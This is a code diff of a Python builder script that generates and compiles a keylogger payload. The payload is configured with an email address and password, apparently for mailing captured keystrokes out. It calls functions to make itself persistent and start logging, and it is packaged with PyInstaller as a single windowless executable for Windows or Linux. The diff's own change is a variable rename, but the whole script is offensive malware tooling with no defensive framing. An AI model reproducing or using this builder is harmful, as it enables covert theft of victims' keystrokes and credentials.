@@ -19,18 +19,18 @@ def get_arguments():
     required_arguments.add_argument("-o", "--out", dest="out", help="Output file name.", required=True)
     return parser.parse_args()
 
-def create_keylogger(file_name, interval, email, password):
-    with open(file_name, "w+") as file:
+def create_keylogger(keylogger, interval, email, password):
+    with open(keylogger, "w+") as file:
         file.write("import keylogger\n")
         file.write("zlogger = keylogger.Keylogger(" + interval + ",'" + email + "','" + password + "')\n")
         file.write("zlogger.become_persistent()\n")
         file.write("zlogger.start()\n")
 
-def compile_for_windows(file_name):
-    subprocess.call(["wine", WINDOWS_PYTHON_INTERPRETER_PATH, "--onefile", "--noconsole", file_name])
+def compile_for_windows(keylogger):
+    subprocess.call(["wine", WINDOWS_PYTHON_INTERPRETER_PATH, "--onefile", "--noconsole", keylogger])
 
-def compile_for_linux(file_name):
-    subprocess.call(["pyinstaller", "--onefile", "--noconsole", file_name])
+def compile_for_linux(keylogger):
+    subprocess.call(["pyinstaller", "--onefile", "--noconsole", keylogger])
 
 arguments = get_arguments()
 create_keylogger(arguments.out, arguments.interval, arguments.email, arguments.password)
